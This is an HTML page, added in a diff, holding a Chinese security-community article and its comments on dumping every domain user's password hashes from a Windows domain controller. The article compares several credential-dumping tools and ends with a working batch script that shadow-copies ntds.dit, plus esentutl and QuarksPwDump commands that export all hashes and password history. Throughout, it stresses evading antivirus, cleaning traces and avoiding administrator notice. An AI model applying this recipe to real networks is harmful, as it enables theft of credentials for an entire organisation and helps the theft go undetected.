@@ -1,0 +1,98 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">导出当前域内所有用户hash的技术整理</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/07/03 15:06" ui-time="" datetime="2015/07/03 15:06" class="published ng-binding ng-isolate-scope">2015/07/03 15:06</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00目标：</h1><hr><p>导出当前域内所有用户的hash</p><h1>0x01测试环境：</h1><hr><pre><code>域控：server2008 r2
+杀毒软件：已安装*
+域控权限：可使用net use远程登陆，不使用3389
+</code></pre><h1>0x02测试方法：</h1><hr><p>（1）mimikatz：</p><pre><code>hash数量：只能抓取登陆过的用户hash，无法抓取所有用户
+免杀：需要免杀
+</code></pre><p>（2）pwdump：</p><pre><code>hash数量：无法抓取所有用户
+免杀：需要免杀
+</code></pre><p>（3）vssown.vbs + libesedb + NtdsXtract</p><pre><code>hash数量：所有用户
+免杀：不需要
+优点：
+    获得信息很全面，可获得以下信息：
+    Record ID
+    User name
+    User principal name
+    SAM Account name
+    SAM Account type
+    GUID
+    SID
+    When created
+    When changed
+    Account expires
+    Password last set
+    Last logon
+    Last logon timestamp
+    Bad password time
+    Logon count
+    Bad password count
+    User Account Control
+    Ancestors
+    Password hashes
+    Password history
+    Supplemental credentials
+    Member of
+
+缺点：
+    vssown.vbs使用后需要删除快照清理痕迹
+    vssown.vbs偶尔会报错
+    数据库巨大，下载回本地很麻烦
+    libesedb + NtdsXtract环境搭建麻烦，目前网上中文的教程存在一些错误，下载链接也已失效，需要自行摸索
+    用vssown.vbs复制出来的ntds.dit数据库无法使用QuarksPwDump.exe读取       
+</code></pre><hr><p><strong><em>Tips:</em></strong><br>libesedb + NtdsXtract环境搭建的一点提示：</p><pre><code>(download libesedb)
+https://github.com/libyal/libesedb/releases/download/20150409/libesedb-experimental-20150409.tar.gz
+tar zxvf libesedb-experimental-20150409.tar.gz
+cd libesedb-20150409
+./configure
+make
+cd esedbtools/
+./esedbexport
+(copy ntds.dit to ~/libesedb-20150409/esedbtools)
+./esedbexport ./ntds.dit
+(wait...)
+mv ntds.dit.export/ ../../
+（download ntdsxtract）
+http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
+unzip ntdsxtract_v1_0.zip
+cd NTDSXtract 1.0/
+(move SYSTEM to '/root/SYSTEM')
+(get passwordhashes )
+python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes '/root/SYSTEM'
+</code></pre><hr><p>（4）ntdsutil.exe + QuarksPwDump.exe</p><pre><code>hash数量：所有用户 
+免杀：QuarksPwDump.exe需要免杀 
+优点： 
+    获得信息很全面 QuarksPwDump.exe可在windows下使用，读取hash值的操作简便快捷
+缺点： 
+    ntdsutil.exe使用后需要删除快照清理痕迹 ntdsutil.exe偶尔会报错 巨大的数据库，QuarksPwDump.exe读取偶尔会报错 server2003的shell下无法使用
+</code></pre><h1>0x03实际测试：</h1><hr><ul><li>gethashes.exe：没有源码，忽略</li><li>mimikatz：无法抓出所有用户hash，本机管理员口令也无法导出</li><li>pwdump：抓取数量不足</li><li>vssown.vbs + libesedb + NtdsXtract：成功，耗时3天+</li><li>ntdsutil.exe + QuarksPwDump.exe：ntdsutil.exe报错，失败</li></ul><h1>0x04分析：</h1><hr><p>5种方法唯一成功的是<code>vssown.vbs + libesedb + NtdsXtract</code>，但是耗时太久，操作麻烦，下载数据库容易暴露，<code>vssown.vbs</code>备份的信息容易被管理员发现</p><p>其他方法中可取的地方：<code>vssown.vbs</code>复制数据库的方法很是巧妙，但存在一些不足，配合域控的at命令执行较为麻烦；QuarksPwDump.exe可在windows下直接使用，免去读取数据库的等待，并且<code>QuarksPwDump</code>可获得源码，能够配合实际使用做修改。</p><p>那么大胆设想一下：如果使用<code>QuarksPwDump.exe</code>在域控上直接读取<code>ntds.dit</code>岂不是最好</p><h1>0x05改进：</h1><hr><p>（1）分析<code>vssown.vbs</code>的复制办法，找到一种更好的解决办法，改用<code>ShadowCopy</code>实现<code>ntds.dit</code>的复制 （2）对<code>QuarksPwDump</code>的改造，实现命令行下的自动读取及导出信息</p><hr><p><strong><em>Tips：</em></strong></p><pre><code>ShadowCopy 是一款增强型的免费文件复制工具，由于使用了微软卷影副本（`Volume Shadow Copy`）技术，它能够复制被锁定的文件或者被其他程序打开的文件，
+
+因此只要是硬盘的上的文件，即使正被程序占用，`ShadowCopy` 都可以拷贝出来。
+</code></pre><h1>0x06最终方案：</h1><hr><p>（1）使用ShadowCopy的命令行版，编写bat实现拷贝ntds.dit至当前目录</p><pre><code>setlocal
+if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
+set SOURCE_DRIVE_LETTER=%SystemDrive%
+set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
+set DESTINATION_PATH=%~dp0
+@echo ...Determine the scripts to be executed/generated...
+set CALLBACK_SCRIPT=%~dpnx0
+set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
+@echo ...Creating the shadow copy...
+"%~dp0vsshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
+del /f %TEMP_GENERATED_SCRIPT%
+@goto :EOF
+:IS_CALLBACK
+setlocal
+@echo ...Obtaining the shadow copy device name...
+call %TEMP_GENERATED_SCRIPT%
+@echo ...Copying from the shadow copy to the destination path...
+copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%
+</code></pre><p>参考链接： http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx</p><p>（2）使用QuarksPwDump直接读取信息并将结果导出至文件，先执行</p><pre><code>esentutl /p /o ntds.dit
+</code></pre><p>修复复制出来的数据库</p><pre><code>QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt
+</code></pre><p>读取并导出。</p><p>注：实际使用时ntds.dit和log.txt需要加绝对路径</p><hr><p><strong><em>Tips：</em></strong></p><pre><code>QuarksPwDump.exe：Dump various types of Windows credentials without injecting in any process.
+源码下载链接，vs2010直接编译即可
+https://github.com/quarkslab/quarkspwdump
+</code></pre><h1>0x07小结：</h1><hr><p>ShadowCopy+QuarksPwDump：</p><pre><code>hash数量：所有用户
+免杀：不需要
+优点：
+    获得信息全面
+    bat一键搞定，简单高效
+    无需下载ntds.dit，隐蔽性高
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">first</span> <span class="reply-time">2016-06-21 15:17:36</span></div><p></p><p>@三好学生<br>ERROR: COM call &quot;m_pVssObject-&gt;InitializeForBackup()&quot; failed.<br>- Returned HRESULT = 0x80042302<br>- Error text: &lt;Unknown error code&gt;<br>- Please re-run VSHADOW.EXE with the /tracing option to get more details<br>shadcopy报这样的错是为什么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0x70</span> <span class="reply-time">2016-05-06 20:54:25</span></div><p></p><p>@三好学生<br>[+] SYSKEY restrieving...[OK]<br>SYSKEY = 4A5DB246C825E2568509D58340D30DB8<br>[+] Init JET engine...OK<br>[+] Open Database c:\Users\2015000\Desktop\ntds.dit...ERROR : JetOpenDatabase() failed with JET_ERR = -602<br>Details : JET_errUnicodeTranslationFail, Unicode normalization failed<br>[!] NTDS_OpenDatabase failed!</p><p>求教，这又是什么鬼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-05-06 15:18:47</span></div><p></p><p>@0x70 https://github.com/quarkslab/quarkspwdump/pull/3</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0x70</span> <span class="reply-time">2016-05-06 15:13:21</span></div><p></p><p>+] Parsing datatable...Fatal error: not enough memory!<br>爆这个错误是怎么回事？怎么解决</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">若</span> <span class="reply-time">2015-11-26 23:44:03</span></div><p></p><p>给楼主一个提示：VSHADOW</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-07-08 08:16:33</span></div><p></p><p>@浮生 @喵喵爱吃鱼<br>gsecdump没有源码，免杀比较麻烦，所以就没考虑<br>QuarksPwDump有源码，免杀相对容易很多</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">浮生</span> <span class="reply-time">2015-07-07 19:53:07</span></div><p></p><p>@喵喵爱吃鱼<br>gsecdump杀的有点厉害，需要免杀的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">浮生</span> <span class="reply-time">2015-07-07 19:51:41</span></div><p></p><p>最后方案也是需要 QuarksPwDump.exe免杀的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-07-06 09:57:47</span></div><p></p><p>@_Evil<br>可以用NtdsXtract：<br>python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes &#039;/root/SYSTEM&#039; --passwordhistory &#039;/root/SYSTEM&#039;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-07-06 09:37:26</span></div><p></p><p>@mickey m老湿 文章里面可以所获取账号的历史密码(他说上限是20次内)。 有啥方法？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">喵喵爱吃鱼</span> <span class="reply-time">2015-07-06 09:03:01</span></div><p></p><p>楼主没有测试神器gsecdump呢，可以到处2008所有用户的HASH。貌似2012就不可以了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-07-03 18:04:03</span></div><p></p><p>@mickey 感谢提供参考资料，期末考试我要得100分</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-07-03 17:56:03</span></div><p></p><p>@debug<br>QuarksPwDump确实还有修改提升空间，配合实际需要修改源码就好</p><p></p></div></div></div></div></div></main>
